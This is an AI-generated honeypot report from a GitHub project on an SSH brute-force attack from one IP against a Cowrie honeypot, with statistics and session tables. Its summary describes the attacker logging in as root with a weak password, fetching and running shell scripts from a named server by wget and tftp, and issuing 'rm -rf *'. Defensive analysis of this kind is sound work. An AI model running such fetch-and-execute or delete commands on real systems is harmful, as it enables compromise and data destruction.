
NOTE: This is a .md file with GitHub formatting. 
If you are viewing this in Canvas, please click the following link to view the formatted file on GitHub: 
https://github.com/LucasFaudman/honeypot-ai/blob/main/example-reports/Multi-Stage%20SSH%20Brute%20Force%20Attack%20with%20Possible%20Botnet%20Indications%20Launched%20from%20Compromised%20DigitalOcean%20Server/README.md
Alternatively, you can download the file and view it locally in your IDE.
All relevant logs and scripts can also be found in this repository.



# Multi-Stage SSH Brute Force Attack with Possible Botnet Indications Launched from Compromised DigitalOcean Server

<details>
<summary>
<h2>Quick Stats</h2>
</summary>


- This attack was carried out by a `1` unique source IP address(es): `138.197.148.152`
- A total of `250` sessions were logged. `8` sessions were successful logins.
- `232` login attempts were made. `8` were successful.
- `28` unique username/password pairs were attempted. `1` were successful.
- `1` unique destination ports were targeted: `2222`
- `247` unique source ports were used:  Min: 32872, Max: 60642
- `8` commands were input in total. `1` IP(s) and `1` URL(s) were found in the commands
- `1` unique malware samples were downloaded. `0` IP(s) and `1` URL(s) were found in the malware samples
- This attacks was recorded in `4` log types: `cowrie.log`, `cowrie.json`, `dshield.log`, `zeek.log`
- A total of `3887` log events were logged in `6` log files: `cowrie.2024-01-10.json`, `cowrie.2024-01-10.log`, `dshield.log`, `notice.log`, `conn.log`, `ssh.log`

</details>

---

**Summary of the Attack Details, Methods, and Goals**

According to the available data, the attacker used the IP address `138.197.148.152`, which is associated with DigitalOcean LLC. This IP was the source of malicious SSH login attempts targeted at our system. The geographical location of the IP is in Toronto, Ontario, Canada. 

*Methods Employed:*

1. **Initial Access**: The attacker exploited weak SSH credentials to gain access to the system. The username used was `root`, and the password was `12345678`. This indicates either a brute-force attack or the exploitation of common/default credentials.

2. **Execution of Commands**: The attacker executed a sequence of terminal commands aimed at downloading and running malicious shell scripts (`fuckjewishpeople.sh`, `tftp1.sh` and `tftp2.sh`). These commands were used to modify access permissions and initiate the execution of the scripts. Ultimately, a command to delete all files in the working directory was also issued (`rm -rf *`).

3. **Malware Deployment**: The attacker utilized a shell script (`fuckjewishpeople.sh`) downloaded from a server `213.255.246.81` using the `wget` utility. The command sequences indicate a possible multi-stage malware attack, involving multiple scripts fetched from the same server with the `tftp` utility. 

*Goals of the Attack:*

Based on the analysis of the attack, the likely goals include:

1. **System Compromise and Control**: The attacker aimed to gain initial access to the system using brute-force methods on the SSH service. The primary goal was to breach and maintain control over the targeted system.

2. **Malware Execution and Propagation**: The downloaded shell scripts suggest a deliberate propagation of malware to compromise the system further, possibly to exploit its resources or for lateral movement within a network.

3. **Data Destruction/Damage**: The execution of the `rm -rf *` command suggests a possible intent to delete files. This could either be a form of sabotage, an attempt to clean up or a smokescreen to hide the main intent of the attack.

The exact nature of each script's payload and the breadth of the attacker's objectives could only be fully understood by analyzing the shell scripts' contents.

<details>
<summary>
<h3>Extended Summary</h3>
</summary>


- This attack was carried out by a `1` unique **source IP** address(es):
	- `SourceIP 138.197.148.152 Sessions: 250, Successful Logins: 8, Commands: 8, Downloads 8, `

- `247` unique **source ports** were used:
	- `Src Port: 45526 Used 1 times`
	- `Src Port: 45816 Used 1 times`
	- `Src Port: 53250 Used 1 times`
	- `Src Port: 58904 Used 1 times`
	- `Src Port: 60536 Used 1 times`
	- `Src Port: 33280 Used 1 times`
	- `Src Port: 35600 Used 2 times`
	- `Src Port: 36160 Used 1 times`
	- `Src Port: 37594 Used 1 times`
	- `Src Port: 39134 Used 1 times`
	- `Src Port: 43316 Used 1 times`
	- `Src Port: 44350 Used 1 times`
	- `Src Port: 49780 Used 1 times`
	- `Src Port: 50512 Used 1 times`
	- `Src Port: 51110 Used 1 times`
	- `Src Port: 51830 Used 1 times`
	- `Src Port: 53926 Used 1 times`
	- `Src Port: 55612 Used 1 times`
	- `Src Port: 59256 Used 1 times`
	- `Src Port: 60350 Used 1 times`
	- `Src Port: 37694 Used 1 times`
	- `Src Port: 38444 Used 1 times`
	- `Src Port: 38600 Used 1 times`
	- `Src Port: 39256 Used 1 times`
	- `Src Port: 42212 Used 1 times`
	- `Src Port: 42916 Used 1 times`
	- `Src Port: 47322 Used 1 times`
	- `Src Port: 47706 Used 1 times`
	- `Src Port: 53958 Used 1 times`
	- `Src Port: 54380 Used 1 times`
	- `Src Port: 54626 Used 1 times`
	- `Src Port: 55054 Used 1 times`
	- `Src Port: 58292 Used 1 times`
	- `Src Port: 58742 Used 1 times`
	- `Src Port: 35088 Used 1 times`
	- `Src Port: 35446 Used 1 times`
	- `Src Port: 41690 Used 1 times`
	- `Src Port: 42122 Used 1 times`
	- `Src Port: 42370 Used 1 times`
	- `Src Port: 42848 Used 1 times`
	- `Src Port: 45984 Used 1 times`
	- `Src Port: 46590 Used 1 times`
	- `Src Port: 51036 Used 1 times`
	- `Src Port: 51522 Used 1 times`
	- `Src Port: 57652 Used 1 times`
	- `Src Port: 58216 Used 1 times`
	- `Src Port: 58306 Used 1 times`
	- `Src Port: 58910 Used 1 times`
	- `Src Port: 33846 Used 1 times`
	- `Src Port: 34278 Used 1 times`
	- `Src Port: 38910 Used 1 times`
	- `Src Port: 39162 Used 1 times`
	- `Src Port: 45478 Used 1 times`
	- `Src Port: 45880 Used 1 times`
	- `Src Port: 46188 Used 1 times`
	- `Src Port: 46576 Used 1 times`
	- `Src Port: 49840 Used 1 times`
	- `Src Port: 50296 Used 1 times`
	- `Src Port: 54682 Used 1 times`
	- `Src Port: 55448 Used 1 times`
	- `Src Port: 33116 Used 1 times`
	- `Src Port: 33818 Used 1 times`
	- `Src Port: 33850 Used 1 times`
	- `Src Port: 34560 Used 1 times`
	- `Src Port: 37472 Used 1 times`
	- `Src Port: 38230 Used 1 times`
	- `Src Port: 42460 Used 1 times`
	- `Src Port: 43258 Used 1 times`
	- `Src Port: 49084 Used 1 times`
	- `Src Port: 49760 Used 1 times`
	- `Src Port: 49910 Used 1 times`
	- `Src Port: 50598 Used 2 times`
	- `Src Port: 53388 Used 1 times`
	- `Src Port: 54328 Used 1 times`
	- `Src Port: 58422 Used 1 times`
	- `Src Port: 59236 Used 1 times`
	- `Src Port: 36804 Used 1 times`
	- `Src Port: 37516 Used 1 times`
	- `Src Port: 37644 Used 1 times`
	- `Src Port: 38336 Used 1 times`
	- `Src Port: 41202 Used 1 times`
	- `Src Port: 42002 Used 1 times`
	- `Src Port: 46102 Used 1 times`
	- `Src Port: 47060 Used 1 times`
	- `Src Port: 52692 Used 1 times`
	- `Src Port: 53370 Used 1 times`
	- `Src Port: 53758 Used 1 times`
	- `Src Port: 54430 Used 1 times`
	- `Src Port: 57066 Used 1 times`
	- `Src Port: 58032 Used 1 times`
	- `Src Port: 33740 Used 1 times`
	- `Src Port: 34854 Used 1 times`
	- `Src Port: 40406 Used 1 times`
	- `Src Port: 41102 Used 1 times`
	- `Src Port: 41476 Used 1 times`
	- `Src Port: 42176 Used 1 times`
	- `Src Port: 44760 Used 1 times`
	- `Src Port: 45858 Used 1 times`
	- `Src Port: 49686 Used 1 times`
	- `Src Port: 50884 Used 1 times`
	- `Src Port: 56206 Used 1 times`
	- `Src Port: 56902 Used 1 times`
	- `Src Port: 57594 Used 1 times`
	- `Src Port: 58294 Used 1 times`
	- `Src Port: 60596 Used 1 times`
	- `Src Port: 33744 Used 1 times`
	- `Src Port: 37164 Used 1 times`
	- `Src Port: 38838 Used 1 times`
	- `Src Port: 43732 Used 1 times`
	- `Src Port: 44398 Used 1 times`
	- `Src Port: 45562 Used 1 times`
	- `Src Port: 46236 Used 1 times`
	- `Src Port: 48086 Used 1 times`
	- `Src Port: 49942 Used 1 times`
	- `Src Port: 52892 Used 1 times`
	- `Src Port: 55018 Used 1 times`
	- `Src Port: 59552 Used 1 times`
	- `Src Port: 60240 Used 1 times`
	- `Src Port: 33480 Used 1 times`
	- `Src Port: 34184 Used 1 times`
	- `Src Port: 37898 Used 1 times`
	- `Src Port: 41642 Used 1 times`
	- `Src Port: 41766 Used 1 times`
	- `Src Port: 47932 Used 1 times`
	- `Src Port: 48638 Used 1 times`
	- `Src Port: 48806 Used 1 times`
	- `Src Port: 49622 Used 1 times`
	- `Src Port: 52188 Used 1 times`
	- `Src Port: 53330 Used 1 times`
	- `Src Port: 56400 Used 1 times`
	- `Src Port: 58884 Used 1 times`
	- `Src Port: 34988 Used 1 times`
	- `Src Port: 35674 Used 1 times`
	- `Src Port: 37092 Used 1 times`
	- `Src Port: 37836 Used 1 times`
	- `Src Port: 39376 Used 1 times`
	- `Src Port: 41586 Used 1 times`
	- `Src Port: 45018 Used 1 times`
	- `Src Port: 45794 Used 1 times`
	- `Src Port: 51674 Used 1 times`
	- `Src Port: 52354 Used 1 times`
	- `Src Port: 52434 Used 1 times`
	- `Src Port: 53176 Used 1 times`
	- `Src Port: 56024 Used 1 times`
	- `Src Port: 56772 Used 1 times`
	- `Src Port: 32964 Used 1 times`
	- `Src Port: 33288 Used 1 times`
	- `Src Port: 39662 Used 1 times`
	- `Src Port: 39860 Used 1 times`
	- `Src Port: 40346 Used 1 times`
	- `Src Port: 40556 Used 1 times`
	- `Src Port: 44124 Used 1 times`
	- `Src Port: 44136 Used 1 times`
	- `Src Port: 48832 Used 1 times`
	- `Src Port: 49358 Used 1 times`
	- `Src Port: 55400 Used 1 times`
	- `Src Port: 56060 Used 1 times`
	- `Src Port: 56142 Used 1 times`
	- `Src Port: 56770 Used 1 times`
	- `Src Port: 59734 Used 1 times`
	- `Src Port: 60458 Used 1 times`
	- `Src Port: 36278 Used 1 times`
	- `Src Port: 37326 Used 1 times`
	- `Src Port: 42976 Used 1 times`
	- `Src Port: 43686 Used 1 times`
	- `Src Port: 43922 Used 1 times`
	- `Src Port: 44616 Used 1 times`
	- `Src Port: 47352 Used 1 times`
	- `Src Port: 48318 Used 1 times`
	- `Src Port: 52316 Used 1 times`
	- `Src Port: 53266 Used 2 times`
	- `Src Port: 58888 Used 1 times`
	- `Src Port: 59568 Used 1 times`
	- `Src Port: 59966 Used 1 times`
	- `Src Port: 60642 Used 1 times`
	- `Src Port: 35016 Used 1 times`
	- `Src Port: 36094 Used 1 times`
	- `Src Port: 39624 Used 1 times`
	- `Src Port: 41502 Used 1 times`
	- `Src Port: 46258 Used 1 times`
	- `Src Port: 46920 Used 1 times`
	- `Src Port: 48148 Used 1 times`
	- `Src Port: 48838 Used 1 times`
	- `Src Port: 52468 Used 1 times`
	- `Src Port: 55522 Used 1 times`
	- `Src Port: 57538 Used 1 times`
	- `Src Port: 33888 Used 1 times`
	- `Src Port: 34552 Used 1 times`
	- `Src Port: 35952 Used 1 times`
	- `Src Port: 36652 Used 1 times`
	- `Src Port: 38262 Used 1 times`
	- `Src Port: 40330 Used 1 times`
	- `Src Port: 43026 Used 1 times`
	- `Src Port: 45510 Used 1 times`
	- `Src Port: 49684 Used 1 times`
	- `Src Port: 50372 Used 1 times`
	- `Src Port: 52140 Used 1 times`
	- `Src Port: 52828 Used 1 times`
	- `Src Port: 53982 Used 1 times`
	- `Src Port: 56578 Used 1 times`
	- `Src Port: 59066 Used 1 times`
	- `Src Port: 33204 Used 1 times`
	- `Src Port: 37476 Used 1 times`
	- `Src Port: 38162 Used 1 times`
	- `Src Port: 39846 Used 1 times`
	- `Src Port: 40550 Used 1 times`
	- `Src Port: 41782 Used 1 times`
	- `Src Port: 44258 Used 1 times`
	- `Src Port: 46724 Used 1 times`
	- `Src Port: 49300 Used 1 times`
	- `Src Port: 53940 Used 1 times`
	- `Src Port: 56002 Used 1 times`
	- `Src Port: 56694 Used 1 times`
	- `Src Port: 57548 Used 1 times`
	- `Src Port: 60346 Used 1 times`
	- `Src Port: 34130 Used 1 times`
	- `Src Port: 37310 Used 1 times`
	- `Src Port: 40718 Used 1 times`
	- `Src Port: 41396 Used 1 times`
	- `Src Port: 44134 Used 1 times`
	- `Src Port: 44854 Used 1 times`
	- `Src Port: 44936 Used 1 times`
	- `Src Port: 48558 Used 1 times`
	- `Src Port: 49674 Used 1 times`
	- `Src Port: 53722 Used 1 times`
	- `Src Port: 56290 Used 1 times`
	- `Src Port: 56980 Used 1 times`
	- `Src Port: 60424 Used 1 times`
	- `Src Port: 60628 Used 1 times`
	- `Src Port: 32872 Used 1 times`
	- `Src Port: 36472 Used 1 times`
	- `Src Port: 37304 Used 1 times`
	- `Src Port: 41790 Used 1 times`
	- `Src Port: 43820 Used 1 times`
	- `Src Port: 44514 Used 1 times`
	- `Src Port: 48204 Used 1 times`
	- `Src Port: 48424 Used 1 times`
	- `Src Port: 49114 Used 1 times`
	- `Src Port: 52768 Used 1 times`
	- `Src Port: 53084 Used 1 times`
	- `Src Port: 57860 Used 1 times`
	- `Src Port: 59696 Used 1 times`
	- `Src Port: 60376 Used 1 times`
	- `Src Port: 35818 Used 1 times`
	- `Src Port: 36272 Used 1 times`
	- `Src Port: 36942 Used 1 times`
	- `Src Port: 40656 Used 1 times`

- `1` unique **destination ports** were targeted:
	- `Dst Port: `2222` Used `250` times`

- A total of `250` sessions were logged:
	- `Session 0a50b73a3389 SSH 138.197.148.152:45526 -> 172.31.5.68:2222 Duration: 0.07s`
	- `Session 464b1d7aaa20 SSH 138.197.148.152:45816 -> 172.31.5.68:2222 Duration: 0.07s`
	- `Session 0b40f14a6957 SSH 138.197.148.152:53250 -> 172.31.5.68:2222 Duration: 0.52s`
	- `Session 9eb15b71841c SSH 138.197.148.152:58904 -> 172.31.5.68:2222 Duration: 0.53s`
	- `Session 2a452e58ecbb SSH 138.197.148.152:60536 -> 172.31.5.68:2222 Duration: 0.54s`
	- `Session 0c9cbb37b75f SSH 138.197.148.152:33280 -> 172.31.5.68:2222 Duration: 0.53s`
	- `Session 3426ee721a58 SSH 138.197.148.152:35600 -> 172.31.5.68:2222 Duration: 0.57s`
	- `Session e04e0ce44a5c SSH 138.197.148.152:36160 -> 172.31.5.68:2222 Duration: 0.56s`
	- `Session 7d2597397689 SSH 138.197.148.152:37594 -> 172.31.5.68:2222 Duration: 0.56s`
	- `Session b62b753e1f6c SSH 138.197.148.152:39134 -> 172.31.5.68:2222 Duration: 0.47s`
	- `Session bbe2acea1d85 SSH 138.197.148.152:43316 -> 172.31.5.68:2222 Duration: 0.53s`
	- `Session 8b012837f18d SSH 138.197.148.152:44350 -> 172.31.5.68:2222 Duration: 0.53s`
	- `Session ffd84543e06a SSH 138.197.148.152:49780 -> 172.31.5.68:2222 Duration: 0.51s`
	- `Session acc1547fb14a SSH 138.197.148.152:50512 -> 172.31.5.68:2222 Duration: 0.53s`
	- `Session 549821554ddb SSH 138.197.148.152:51110 -> 172.31.5.68:2222 Duration: 0.50s`
	- `(and `235` more)`

- `8` were **successful logins**, 
- `242` were **failed logins**, 
- `8` had commands, 
- `8` had malware.
- `232` unique username/password pairs were attempted. `8` were successful.
- `8` commands were input in total. `8` IP(s) and `8` URL(s) were found in the commands
- `1` unique malware samples were downloaded. 
- `0` unique IP(s) and `1` unique URL(s) were found in the malware samples
- This attacks was recorded in `4` log types: 
	- `cowrie.log`
	- `cowrie.json`
	- `dshield.log`
	- `zeek.log`

- A total of `3887` log events were logged in `6` log files: 
	- `cowrie.2024-01-10.json`
	- `cowrie.2024-01-10.log`
	- `dshield.log`
	- `notice.log`
	- `conn.log`
	- `ssh.log`


</details>

---


<details>
<summary>
<h2>Custom Scripts Used To Generate This Report</h2>
</summary>


#### [main.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/main.py)
> Main script for initializing and running all analyzer objects according to command line arguments and config file

#### [attackanalyzer.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/attackanalyzer.py)
> High level class for running OSINTAnalyzers and OpenAIAnalyzer on Attack objects after being created by the LogProcessor

#### [analyzerbase](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase)
> Base classes, utility functions, libraries, and constants for all analyzer modules

| Script | Description |
| --- | --- |
| [common.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/common.py) | Imports and constants used by all analyzer modules |
| [baseobjects.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/baseobjects.py) | Custom base classes for all objects. CachePropertyObject allows temporary caching of properties for faster processing while remaining dynamic. SmartAttrObject allows properties to be called with modifiers like uniq_ and num_ |
| [attack.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/attack.py) | Attack object for storing all data related to a single attack. Constructed by LogProcessor and modified by OSINTAnalyzers and OpenAIAnalyzers |
| [malware.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/malware.py) | Malware object for storing, standardizing and reading a malware sample. Constructed by its parent Session object and accessed by its Attack object |
| [session.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/session.py) | Session object for storing all data related to a single session. Constructed by its parent SourceIP object and accessed by its parent Attack object |
| [sourceip.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/sourceip.py) | SourceIP object for storing all data related to a single source IP. Constructed by the loganalyzer scripts and accessed by its Attack object |
| [util.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/util.py) | Utility functions for all analyzer modules including functions for extracting IPs and URLs from text, standardizing malware, and hashing text |

#### [loganalyzers](https://github.com/LucasFaudman/honeypot-ai/blob/main/loganalyzers)
> Scripts for analyzing logs to create Attack objects, organizing and reading Attack directories

| Script | Description |
| --- | --- |
| [logparser.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/loganalyzers/logparser.py) | Classes for reading all logs into Python objects with standardized keys |
| [logprocessor.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/loganalyzers/logprocessor.py) | Processes logs into Attack objects by creating SourceIP, Session, and Malware objects and adding them to an Attack object when specified conditions are met. |
| [attackdirorganizer.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/loganalyzers/attackdirorganizer.py) | Organizes Attack files into directories by source IP and attack ID for easy reading and quicker loading |
| [attackdirreader.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/loganalyzers/attackdirreader.py) | Reads and counts log events in Attack directories organized by attackdirorganizer |

#### [openaianalyzers](https://github.com/LucasFaudman/honeypot-ai/blob/main/openaianalyzers)
> Scripts for analyzing Attack objects using OpenAI's Completions and Assistant APIs

| Script | Description |
| --- | --- |
| [aibase.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/openaianalyzers/aibase.py) | Base class used by all OpenAI analyzers that handles catching API errors, formating content for the API, and counting tokens to calculate cost |
| [completions.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/openaianalyzers/completions.py) | OpenAICompletionsAnalyzer uses the the Completions API with few-shot-prompting to explain commands and comment malware source code |
| [assistant.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/openaianalyzers/assistant.py) | OpenAIAssistantAnalyzer uses the Assistant API with function-calling to query an Attack object to answer questions about an Attack object and its subobjects |
| [tools.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/openaianalyzers/tools.py) | Function schemas used by the OpenAIAssistantAnalyzer to structure how the model can iterogate the Attack object and its Session and Malware subobjects |

#### [osintanalyzers](https://github.com/LucasFaudman/honeypot-ai/blob/main/osintanalyzers)
> Scripts for collecting OSINT data for IPs, URLS and Malware found in the Attack object

| Script | Description |
| --- | --- |
| [osintbase.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/osintanalyzers/osintbase.py) | Base class for all OSINT analyzers that uses requests and SoupScraper to collect data handles catching API errors, reading/writing stored data, and reducing data for before passing to OpenAIAnalyzer |
| [ipanalyzer.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/osintanalyzers/ipanalyzer.py) | IPAnalyzer handles collecting data on IPs from ISC, Shodan, Threatfox, Cybergordon, Whois |
| [malwareanalyzer.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/osintanalyzers/malwareanalyzer.py) | MalwareAnalyzer handles collecting data on malware and IOCs from MalwareBazaar, ThreatFox, URLhaus, Malpedia, and Explot-DB |
| [soupscraper.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/osintanalyzers/soupscraper.py) | SoupScraper an all in one class for simple scraping with BeautifulSoup + Selenium I borrowed from my previous projects |

#### [markdownwriters](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters)
> Scripts for writing markdown files from Attack objects

| Script | Description |
| --- | --- |
| [markdownwriterbase.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters/markdownwriterbase.py) | Base class for all markdown writers and markdown shortcut functions |
| [attackmarkdownwriter.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters/attackmarkdownwriter.py) | Markdown writer for Attack objects following ISC format |
| [ipmarkdownwriter.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters/ipmarkdownwriter.py) | Markdown writer for ipdata added to Attack objects by IPAnalyzer |
| [runstepsmarkdownwriter.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters/runstepsmarkdownwriter.py) | Markdown writer for AI RunSteps for questions asked by the OpenAIAssistantAnalyzer when processed by the AttackAnalyzer and when in interactive mode |
| [docsmarkdownwriter.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters/docsmarkdownwriter.py) | Markdown writer for the honeypot-ai project documentation and README |
| [visualizer.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters/visualizer.py) | Graphing functions for visualizing data from Counter objects from Attack().counts and osint_data['counts']. (Not currently used due to crowding) |

#### [setup.sh](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup.sh)
> Setup script for installing the honeypot-ai project

#### [setup](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup)
> Scripts for setting up the honeypot-ai project

| Script | Description |
| --- | --- |
| [requirements.txt](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup/requirements.txt) | List of all required packages for the honeypot-ai project |
| [getchromedrier.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup/getchromedrier.py) | Utility script to download correct chromedriver for Selenium |
| [sync-logs.sh](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup/sync-logs.sh) | Utility script to sync logs from honeypot to honeypot-ai project logs directory |
| [install-zeek-on-honeypot.sh](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup/install-zeek-on-honeypot.sh) | Utility script to install Zeek on a remote honeypot |

</details>

---


<details>
<summary>
<h1>Time and Date of Activity</h1>
</summary>

First activity logged: `2024-01-10 02:01:37.777153`
* First session: `0a50b73a3389`
* `Session 0a50b73a3389 SSH 138.197.148.152:45526 -> 172.31.5.68:2222 Duration: 0.07s`

Last activity logged: `2024-01-10 02:23:47.162096`
* Last session: `122ffc7274d8`
* `Session 122ffc7274d8 SSH 138.197.148.152:40656 -> 172.31.5.68:2222 Duration: 0.52s`


| Session ID | IP | Src Port | Dst Port | Start Time | End Time | Duration |
| --- | --- | --- | --- | --- | --- | --- |
| `0a50b73a3389` | `138.197.148.152` | `45526` | `2222` | `2024-01-10 02:01:37.777153` | `2024-01-10 02:01:37.845658` | `0.068505` |
| `122ffc7274d8` | `138.197.148.152` | `40656` | `2222` | `2024-01-10 02:23:45.638765` | `2024-01-10 02:23:47.162096` | `0.523331` |

The attack involved numerous SSH sessions from the attacker's IP `138.197.148.152` to the honeypot IP `172.31.5.68:2222`. Here is a summary of these sessions:

- **Total Sessions:** Multiple sessions with varying durations from a few hundred milliseconds to nearly one second.
- **Connection Durations:** Ranged from as brief as 0.04 seconds to as long as 0.98 seconds.
- **Credentials Used:** Some sessions show successful logins using the username `root` and password `12345678`.
- **Commands Executed:** In several sessions where the login was successful, at least one command was executed.
- **Malware:** In sessions where logins were successful, malware downloads have been noted.
- **Attack Characteristics:**
  - The sessions included multiple source ports indicating a possible scanning or brute force attempt.
  - Quick successive connections suggest automated SSH login attempts.
  - The similarity in connection durations suggests that a script or botnet is likely responsible for the attack.

An excerpt of session details:

1. **Session 8599dd602207**
   - Login: `root:12345678`
   - Commands: 1
   - Malware: 1
   - Duration: 0.08 seconds

2. **Session 0a7536c99648**
   - Login: `root:12345678`
   - Commands: 1
   - Malware: 1
   - Duration: 0.11 seconds

(Note: The specific `Session` identifiers were truncated due to the large output. For comprehensive analysis, we would potentially loop through all sessions to get each's attributes and actions.)

<details>
<summary>
<h3>All Sessions</h3>
</summary>


| Session ID | IP | Src Port | Dst Port | Start Time | End Time | Duration |
| --- | --- | --- | --- | --- | --- | --- |
| `0a50b73a3389` | `138.197.148.152` | `45526` | `2222` | `2024-01-10 02:01:37.777153` | `2024-01-10 02:01:37.845658` | `0.068505` |
| `464b1d7aaa20` | `138.197.148.152` | `45816` | `2222` | `2024-01-10 02:01:37.880971` | `2024-01-10 02:01:37.952177` | `0.071206` |
| `0b40f14a6957` | `138.197.148.152` | `53250` | `2222` | `2024-01-10 02:01:44.611932` | `2024-01-10 02:01:46.131188` | `0.519256` |
| `9eb15b71841c` | `138.197.148.152` | `58904` | `2222` | `2024-01-10 02:01:44.896103` | `2024-01-10 02:01:46.425030` | `0.528927` |
| `2a452e58ecbb` | `138.197.148.152` | `60536` | `2222` | `2024-01-10 02:01:44.985966` | `2024-01-10 02:01:46.521566` | `0.5356` |
| `0c9cbb37b75f` | `138.197.148.152` | `33280` | `2222` | `2024-01-10 02:01:45.033137` | `2024-01-10 02:01:46.565757` | `0.53262` |
| `3426ee721a58` | `138.197.148.152` | `35600` | `2222` | `2024-01-10 02:01:45.180746` | `2024-01-10 02:01:46.755646` | `0.5749` |
| `e04e0ce44a5c` | `138.197.148.152` | `36160` | `2222` | `2024-01-10 02:01:45.224227` | `2024-01-10 02:01:46.782652` | `0.558425` |
| `7d2597397689` | `138.197.148.152` | `37594` | `2222` | `2024-01-10 02:01:45.300762` | `2024-01-10 02:01:46.865178` | `0.564416` |
| `b62b753e1f6c` | `138.197.148.152` | `39134` | `2222` | `2024-01-10 02:01:45.408276` | `2024-01-10 02:01:46.880906` | `0.47263` |
| `bbe2acea1d85` | `138.197.148.152` | `43316` | `2222` | `2024-01-10 02:01:47.755066` | `2024-01-10 02:01:49.284586` | `0.52952` |
| `8b012837f18d` | `138.197.148.152` | `44350` | `2222` | `2024-01-10 02:01:47.848103` | `2024-01-10 02:01:49.381948` | `0.533845` |
| `ffd84543e06a` | `138.197.148.152` | `49780` | `2222` | `2024-01-10 02:01:48.359430` | `2024-01-10 02:01:49.874349` | `0.514919` |
| `acc1547fb14a` | `138.197.148.152` | `50512` | `2222` | `2024-01-10 02:01:48.431252` | `2024-01-10 02:01:49.956338` | `0.525086` |
| `549821554ddb` | `138.197.148.152` | `51110` | `2222` | `2024-01-10 02:01:48.487439` | `2024-01-10 02:01:49.990594` | `0.503155` |
| `4cb447d704c8` | `138.197.148.152` | `51830` | `2222` | `2024-01-10 02:01:48.564505` | `2024-01-10 02:01:50.082292` | `0.517787` |
| `69e046cd8a34` | `138.197.148.152` | `53926` | `2222` | `2024-01-10 02:01:48.805146` | `2024-01-10 02:01:50.309227` | `0.504081` |
| `97b43ae77191` | `138.197.148.152` | `55612` | `2222` | `2024-01-10 02:01:48.973612` | `2024-01-10 02:01:50.490924` | `0.517312` |
| `ac39a473eb93` | `138.197.148.152` | `59256` | `2222` | `2024-01-10 02:01:52.500417` | `2024-01-10 02:01:54.022259` | `0.521842` |
| `8a372d2d7fef` | `138.197.148.152` | `60350` | `2222` | `2024-01-10 02:01:52.641232` | `2024-01-10 02:01:54.150190` | `0.508958` |
| `f4bea764c9d4` | `138.197.148.152` | `37694` | `2222` | `2024-01-10 02:01:53.335512` | `2024-01-10 02:01:54.866252` | `0.53074` |
| `dc904f91aae3` | `138.197.148.152` | `38444` | `2222` | `2024-01-10 02:01:53.437291` | `2024-01-10 02:01:54.975109` | `0.537818` |
| `4ca195c6d2cd` | `138.197.148.152` | `38600` | `2222` | `2024-01-10 02:01:53.448712` | `2024-01-10 02:01:54.959157` | `0.510445` |
| `b28f91eff9d1` | `138.197.148.152` | `39256` | `2222` | `2024-01-10 02:01:53.549845` | `2024-01-10 02:01:55.076374` | `0.526529` |
| `426bdeb503ca` | `138.197.148.152` | `42212` | `2222` | `2024-01-10 02:01:53.960870` | `2024-01-10 02:01:55.480125` | `0.519255` |
| `8e629e0ecf66` | `138.197.148.152` | `42916` | `2222` | `2024-01-10 02:01:54.056442` | `2024-01-10 02:01:55.596745` | `0.540303` |
| `ffcb5245c511` | `138.197.148.152` | `47322` | `2222` | `2024-01-10 02:01:58.997000` | `2024-01-10 02:02:00.495879` | `0.498879` |
| `ef48200bba2d` | `138.197.148.152` | `47706` | `2222` | `2024-01-10 02:01:59.054057` | `2024-01-10 02:02:00.579213` | `0.525156` |
| `de7a83116104` | `138.197.148.152` | `53958` | `2222` | `2024-01-10 02:02:00.078689` | `2024-01-10 02:02:01.606274` | `0.527585` |
| `65dc4b7567b3` | `138.197.148.152` | `54380` | `2222` | `2024-01-10 02:02:00.149820` | `2024-01-10 02:02:01.665430` | `0.51561` |
| `16692a7054c1` | `138.197.148.152` | `54626` | `2222` | `2024-01-10 02:02:00.187532` | `2024-01-10 02:02:01.692842` | `0.50531` |
| `3149438a3542` | `138.197.148.152` | `55054` | `2222` | `2024-01-10 02:02:00.266858` | `2024-01-10 02:02:01.783672` | `0.516814` |
| `94e1fdf36654` | `138.197.148.152` | `58292` | `2222` | `2024-01-10 02:02:00.816663` | `2024-01-10 02:02:02.347007` | `0.530344` |
| `46d928ba288a` | `138.197.148.152` | `58742` | `2222` | `2024-01-10 02:02:00.887253` | `2024-01-10 02:02:02.429857` | `0.542604` |
| `8599dd602207` | `138.197.148.152` | `35088` | `2222` | `2024-01-10 02:02:06.979743` | `2024-01-10 02:03:08.057054` | `0.077311` |
| `0a7536c99648` | `138.197.148.152` | `35446` | `2222` | `2024-01-10 02:02:07.038639` | `2024-01-10 02:03:08.151948` | `0.113309` |
